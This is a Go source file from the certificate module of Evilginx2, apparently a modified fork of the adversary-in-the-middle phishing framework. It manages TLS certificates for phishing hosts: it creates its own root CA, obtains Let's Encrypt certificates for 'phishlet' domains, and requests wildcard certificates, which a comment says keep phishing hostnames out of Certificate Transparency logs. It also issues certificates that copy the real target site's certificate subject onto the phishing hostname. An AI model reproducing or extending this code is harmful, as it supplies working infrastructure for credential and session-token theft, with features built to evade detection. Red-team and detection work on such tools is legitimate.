package core

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"math/big"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"

	"github.com/caddyserver/certmagic"
)

type CertDb struct {
	cache_dir      string
	magic          *certmagic.Config
	cfg            *Config
	ns             *Nameserver
	httpServer     *HttpServer
	caCert         tls.Certificate
	tlsCache       map[string]*tls.Certificate
	tlsCacheMu     sync.RWMutex // Protects tlsCache from concurrent access
	libdnsProvider *LibDNSProvider
}

func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver, httpServer *HttpServer) (*CertDb, error) {
	os.Setenv("XDG_DATA_HOME", cache_dir)

	o := &CertDb{
		cache_dir:      cache_dir,
		cfg:            cfg,
		ns:             ns,
		httpServer:     httpServer,
		tlsCache:       make(map[string]*tls.Certificate),
		libdnsProvider: NewLibDNSProvider(GetExternalDNS(), cfg),
	}

	if err := os.MkdirAll(filepath.Join(cache_dir, "sites"), 0700); err != nil {
		return nil, err
	}

	certmagic.DefaultACME.Agreed = true
	certmagic.DefaultACME.Email = o.GetEmail()
	// Disable TLS-ALPN challenge: port 443 is already bound by our HTTPS proxy,
	// so certmagic's TLS-ALPN solver cannot bind its own listener.
	// HTTP-01 challenges are handled by our HttpServer on port 80, which integrates
	// with certmagic's distributed challenge handler via HandleHTTPChallenge().
	certmagic.DefaultACME.DisableTLSALPNChallenge = true

	err := o.generateCertificates()
	if err != nil {
		return nil, err
	}
	err = o.reloadCertificates()
	if err != nil {
		return nil, err
	}

	o.magic = certmagic.NewDefault()

	// Link our HttpServer with certmagic for challenge handling
	if httpServer != nil {
		httpServer.SetMagic(o.magic)
	}

	return o, nil
}

func (o *CertDb) GetEmail() string {
	var email string
	fn := filepath.Join(o.cache_dir, "email.txt")

	data, err := ReadFromFile(fn)
	if err != nil {
		email = strings.ToLower(GenRandomString(3) + "@" + GenRandomString(6) + ".com")
		if SaveToFile([]byte(email), fn, 0600) != nil {
			log.Error("saving email error: %s", err)
		}
	} else {
		email = strings.TrimSpace(string(data))
	}
	return email
}

func (o *CertDb) generateCertificates() error {
	var key *rsa.PrivateKey

	pkey, err := ioutil.ReadFile(filepath.Join(o.cache_dir, "private.key"))
	if err != nil {
		pkey, err = ioutil.ReadFile(filepath.Join(o.cache_dir, "ca.key"))
	}

	if err != nil {
		// private key corrupted or not found, recreate and delete all public certificates
		os.RemoveAll(filepath.Join(o.cache_dir, "*"))

		key, err = rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return fmt.Errorf("private key generation failed")
		}
		pkey = pem.EncodeToMemory(&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(key),
		})
		err = ioutil.WriteFile(filepath.Join(o.cache_dir, "ca.key"), pkey, 0600)
		if err != nil {
			return err
		}
	} else {
		block, _ := pem.Decode(pkey)
		if block == nil {
			return fmt.Errorf("private key is corrupted")
		}

		key, err = x509.ParsePKCS1PrivateKey(block.Bytes)
		if err != nil {
			return err
		}
	}

	ca_cert, err := ioutil.ReadFile(filepath.Join(o.cache_dir, "ca.crt"))
	if err != nil {
		notBefore := time.Now()
		aYear := time.Duration(10*365*24) * time.Hour
		notAfter := notBefore.Add(aYear)
		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
		if err != nil {
			return err
		}

		template := x509.Certificate{
			SerialNumber: serialNumber,
			Subject: pkix.Name{
				Country:            []string{},
				Locality:           []string{},
				Organization:       []string{"Evilginx Signature Trust Co."},
				OrganizationalUnit: []string{},
				CommonName:         "Evilginx Super-Evil Root CA",
			},
			NotBefore:             notBefore,
			NotAfter:              notAfter,
			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
			BasicConstraintsValid: true,
			IsCA:                  true,
		}

		cert, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
		if err != nil {
			return err
		}
		ca_cert = pem.EncodeToMemory(&pem.Block{
			Type:  "CERTIFICATE",
			Bytes: cert,
		})
		err = ioutil.WriteFile(filepath.Join(o.cache_dir, "ca.crt"), ca_cert, 0600)
		if err != nil {
			return err
		}
	}

	o.caCert, err = tls.X509KeyPair(ca_cert, pkey)
	if err != nil {
		return err
	}
	return nil
}

// generateSelfSignedWildcard creates a self-signed wildcard certificate for the given domains
// using the internal CA. This is used when no external DNS provider is configured,
// allowing wildcard TLS without Cloudflare or DigitalOcean.
func (o *CertDb) generateSelfSignedWildcard(wildcardDomains []string) error {
	var x509ca *x509.Certificate
	var err error

	if x509ca, err = x509.ParseCertificate(o.caCert.Certificate[0]); err != nil {
		return fmt.Errorf("failed to parse CA certificate: %v", err)
	}

	for _, domain := range wildcardDomains {
		// Check if already cached
		o.tlsCacheMu.RLock()
		_, exists := o.tlsCache[domain]
		o.tlsCacheMu.RUnlock()
		if exists {
			continue
		}

		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
		if err != nil {
			return fmt.Errorf("failed to generate serial number: %v", err)
		}

		// Build DNS names list — include both wildcard and apex
		dnsNames := []string{domain}
		baseDomain := strings.TrimPrefix(domain, "*.")
		if baseDomain != domain {
			dnsNames = append(dnsNames, baseDomain)
		}

		template := x509.Certificate{
			SerialNumber:          serialNumber,
			Issuer:                x509ca.Subject,
			Subject:               pkix.Name{Organization: []string{"Evilginx Wildcard"}, CommonName: domain},
			NotBefore:             time.Now(),
			NotAfter:              time.Now().Add(time.Hour * 24 * 365),
			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
			DNSNames:              dnsNames,
			BasicConstraintsValid: true,
		}

		pkey, err := rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return fmt.Errorf("failed to generate key for %s: %v", domain, err)
		}

		derBytes, err := x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, o.caCert.PrivateKey)
		if err != nil {
			return fmt.Errorf("failed to create certificate for %s: %v", domain, err)
		}

		cert := &tls.Certificate{
			Certificate: [][]byte{derBytes, o.caCert.Certificate[0]},
			PrivateKey:  pkey,
		}

		// Cache for both the wildcard and the apex domain
		o.tlsCacheMu.Lock()
		o.tlsCache[domain] = cert
		if baseDomain != domain {
			o.tlsCache[baseDomain] = cert
		}
		o.tlsCacheMu.Unlock()

		log.Info("wildcard TLS: generated self-signed certificate for %s", domain)
	}

	return nil
}

// setSelfSignedWildcardSync generates self-signed wildcard certificates for all configured domains
// This is the fallback when no external DNS provider is available for DNS-01 ACME challenges
func (o *CertDb) setSelfSignedWildcardSync(wildcardDomains []string) error {
	log.Info("wildcard TLS: generating self-signed wildcard certificates for %d domains (no external DNS required)", len(wildcardDomains))

	// Filter to just wildcard domains (*.domain.com)
	var wildcards []string
	for _, dom := range wildcardDomains {
		if strings.HasPrefix(dom, "*.") {
			wildcards = append(wildcards, dom)
		}
	}

	if len(wildcards) == 0 {
		return fmt.Errorf("no wildcard domains to generate certificates for")
	}

	err := o.generateSelfSignedWildcard(wildcards)
	if err != nil {
		return fmt.Errorf("failed to generate self-signed wildcard certificates: %v", err)
	}

	log.Success("wildcard TLS: generated %d self-signed wildcard certificates", len(wildcards))
	return nil
}

// getWildcardCertificate returns a cached wildcard certificate that matches the hostname.
// It first checks for an exact match, then for a wildcard match (*.domain.com).
func (o *CertDb) getWildcardCertificate(hostname string) *tls.Certificate {
	o.tlsCacheMu.RLock()
	defer o.tlsCacheMu.RUnlock()

	// Exact match
	if cert, ok := o.tlsCache[hostname]; ok {
		return cert
	}

	// Wildcard match: hostname "sub.domain.com" → check "*.domain.com"
	parts := strings.SplitN(hostname, ".", 2)
	if len(parts) == 2 {
		wildcardKey := "*." + parts[1]
		if cert, ok := o.tlsCache[wildcardKey]; ok {
			return cert
		}
	}

	// Base domain match: hostname "domain.com" → check "*.domain.com"
	wildcardKey := "*." + hostname
	if cert, ok := o.tlsCache[wildcardKey]; ok {
		return cert
	}

	return nil
}

// SetupPhishletCertificate obtains TLS certificates for a phishlet's domains using Let's Encrypt HTTP-01
func (o *CertDb) SetupPhishletCertificate(phishlet string, domains []string) error {
	log.Info("cert: obtaining certificates for phishlet '%s': %v", phishlet, domains)
	return o.setManagedSync(domains, 60*time.Second)
}

func (o *CertDb) setManagedSync(hosts []string, t time.Duration) error {
	// Recreate certmagic config to pick up current ACME settings.
	// TLS-ALPN is disabled globally (port 443 is ours), so only HTTP-01 is used.
	o.magic = certmagic.NewDefault()

	// Enable on-demand TLS: if ManageSync misses a host (timeout/rate-limit),
	// certmagic will automatically obtain its cert on the first TLS handshake.
	o.magic.OnDemand = &certmagic.OnDemandConfig{
		DecisionFunc: func(ctx context.Context, name string) error {
			if o.cfg.IsActiveHostname(name) {
				return nil
			}
			return fmt.Errorf("not a managed hostname: %s", name)
		},
	}

	ctx, cancel := context.WithTimeout(context.Background(), t)
	err := o.magic.ManageSync(ctx, hosts)
	cancel()
	if err != nil {
		log.Warning("cert: ManageSync error (on-demand TLS will obtain remaining certs): %s", err)
	}
	return err
}

// setWildcardManagedSync obtains wildcard certificates using DNS-01 challenge
// This prevents phishing hostnames from being exposed in Certificate Transparency logs
func (o *CertDb) setWildcardManagedSync(wildcardDomains []string, t time.Duration) error {
	// Configure DNS-01 solver on the default ACME settings
	certmagic.DefaultACME.DisableHTTPChallenge = true
	certmagic.DefaultACME.DisableTLSALPNChallenge = true
	certmagic.DefaultACME.DNS01Solver = &certmagic.DNS01Solver{
		DNSProvider:        o.libdnsProvider,
		PropagationTimeout: 120 * time.Second, // Wait up to 120s for DNS propagation
		TTL:                60 * time.Second,  // 1 minute TTL for challenge records (faster propagation)
	}

	// Create fresh config with DNS-01 settings
	o.magic = certmagic.NewDefault()

	ctx, cancel := context.WithTimeout(context.Background(), t)
	defer cancel()

	log.Info("wildcard TLS: requesting certificates via DNS-01 challenge for %d domains", len(wildcardDomains))
	for _, dom := range wildcardDomains {
		log.Info("wildcard TLS: will request certificate for: %s", dom)
	}

err := o.magic.ManageSync(ctx, wildcardDomains)
	if err != nil {
		return fmt.Errorf("failed to obtain wildcard certificates: %v", err)
	}

	// Load managed certs into tlsCache so the TLS handler can serve them.
	// Without this, http_proxy.go falls through to self-signed generation
	// because getWildcardCertificate() only checks tlsCache, not certmagic.
	for _, dom := range wildcardDomains {
		var sni string
		if strings.HasPrefix(dom, "*.") {
			// Use a fake subdomain so certmagic matches the wildcard cert,
			// not the base domain cert (which is also managed).
			sni = "wc-probe." + strings.TrimPrefix(dom, "*.")
		} else {
			sni = dom
		}
		hello := &tls.ClientHelloInfo{ServerName: sni}
		tlsCert, err := o.magic.GetCertificate(hello)
		if err == nil && tlsCert != nil {
			o.tlsCacheMu.Lock()
			o.tlsCache[dom] = tlsCert
			baseDom := strings.TrimPrefix(dom, "*.")
			if baseDom != dom {
				o.tlsCache[baseDom] = tlsCert
			}
			o.tlsCacheMu.Unlock()
			log.Info("wildcard TLS: loaded LE cert into TLS cache for %s", dom)
		} else if err != nil {
			log.Warning("wildcard TLS: certmagic lookup failed for %s (sni=%s): %v", dom, sni, err)
		}
	}

	// Reset DNS-01 settings for future non-wildcard operations
	certmagic.DefaultACME.DisableHTTPChallenge = false
	certmagic.DefaultACME.DisableTLSALPNChallenge = false
	certmagic.DefaultACME.DNS01Solver = nil

	return nil
}

// GetLibDNSProvider returns the libdns provider for external access
func (o *CertDb) GetLibDNSProvider() *LibDNSProvider {
	return o.libdnsProvider
}

func (o *CertDb) setUnmanagedSync(verbose bool) error {
	sitesDir := filepath.Join(o.cache_dir, "sites")

	files, err := os.ReadDir(sitesDir)
	if err != nil {
		return fmt.Errorf("failed to list certificates in directory '%s': %v", sitesDir, err)
	}

	for _, f := range files {
		if f.IsDir() {
			certDir := filepath.Join(sitesDir, f.Name())

			certFiles, err := os.ReadDir(certDir)
			if err != nil {
				return fmt.Errorf("failed to list certificate directory '%s': %v", certDir, err)
			}

			var certPath, keyPath string

			var pemCnt, crtCnt, keyCnt int
			for _, cf := range certFiles {
				//log.Debug("%s", cf.Name())
				if !cf.IsDir() {
					switch strings.ToLower(filepath.Ext(cf.Name())) {
					case ".pem":
						pemCnt += 1
						if certPath == "" {
							certPath = filepath.Join(certDir, cf.Name())
						}
						if cf.Name() == "fullchain.pem" {
							certPath = filepath.Join(certDir, cf.Name())
						}
						if cf.Name() == "privkey.pem" {
							keyPath = filepath.Join(certDir, cf.Name())
						}
					case ".crt":
						crtCnt += 1
						if certPath == "" {
							certPath = filepath.Join(certDir, cf.Name())
						}
					case ".key":
						keyCnt += 1
						if keyPath == "" {
							keyPath = filepath.Join(certDir, cf.Name())
						}
					}
				}
			}
			if pemCnt > 0 && crtCnt > 0 {
				if verbose {
					log.Warning("cert_db: found multiple .crt and .pem files in the same directory: %s", certDir)
				}
				continue
			}
			if certPath == "" {
				if verbose {
					log.Warning("cert_db: not a single public certificate found in directory: %s", certDir)
				}
				continue
			}
			if keyPath == "" {
				if verbose {
					log.Warning("cert_db: not a single private key found in directory: %s", certDir)
				}
				continue
			}

			log.Debug("caching certificate: cert:%s key:%s", certPath, keyPath)
			ctx := context.Background()
			_, err = o.magic.CacheUnmanagedCertificatePEMFile(ctx, certPath, keyPath, []string{})
			if err != nil {
				if verbose {
					log.Error("cert_db: failed to load certificate key-pair: %v", err)
				}
				continue
			}
		}
	}
	return nil
}

func (o *CertDb) reloadCertificates() error {
	// TODO: load private certificates from disk
	return nil
}

func (o *CertDb) getTLSCertificate(host string, port int) (*x509.Certificate, error) {
	log.Debug("Fetching TLS certificate for %s:%d ...", host, port)

	config := tls.Config{InsecureSkipVerify: true, NextProtos: []string{"http/1.1"}}
	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), &config)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	state := conn.ConnectionState()

	return state.PeerCertificates[0], nil
}

func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
	var x509ca *x509.Certificate
	var template x509.Certificate

	// Check cache first
	o.tlsCacheMu.RLock()
	cert, ok := o.tlsCache[host]
	o.tlsCacheMu.RUnlock()
	if ok {
		return cert, nil
	}

	if x509ca, err = x509.ParseCertificate(o.caCert.Certificate[0]); err != nil {
		return
	}

	if phish_host == "" {
		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
		if err != nil {
			return nil, err
		}

		template = x509.Certificate{
			SerialNumber:          serialNumber,
			Issuer:                x509ca.Subject,
			Subject:               pkix.Name{Organization: []string{"Evilginx Signature Trust Co."}},
			NotBefore:             time.Now(),
			NotAfter:              time.Now().Add(time.Hour * 24 * 180),
			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
			DNSNames:              []string{host},
			BasicConstraintsValid: true,
		}
		template.Subject.CommonName = host
	} else {
		srvCert, err := o.getTLSCertificate(host, port)
		if err != nil {
			return nil, fmt.Errorf("failed to get TLS certificate for: %s:%d error: %s", host, port, err)
		} else {
			serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
			serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
			if err != nil {
				return nil, err
			}

			template = x509.Certificate{
				SerialNumber:          serialNumber,
				Issuer:                x509ca.Subject,
				Subject:               srvCert.Subject,
				NotBefore:             srvCert.NotBefore,
				NotAfter:              time.Now().Add(time.Hour * 24 * 180),
				KeyUsage:              srvCert.KeyUsage,
				ExtKeyUsage:           srvCert.ExtKeyUsage,
				IPAddresses:           srvCert.IPAddresses,
				DNSNames:              []string{phish_host},
				BasicConstraintsValid: true,
			}
			template.Subject.CommonName = phish_host
		}
	}

	var pkey *rsa.PrivateKey
	if pkey, err = rsa.GenerateKey(rand.Reader, 1024); err != nil {
		return
	}

	var derBytes []byte
	if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, o.caCert.PrivateKey); err != nil {
		return
	}

	cert = &tls.Certificate{
		Certificate: [][]byte{derBytes, o.caCert.Certificate[0]},
		PrivateKey:  pkey,
	}

	o.tlsCacheMu.Lock()
	o.tlsCache[host] = cert
	o.tlsCacheMu.Unlock()
	return cert, nil
}
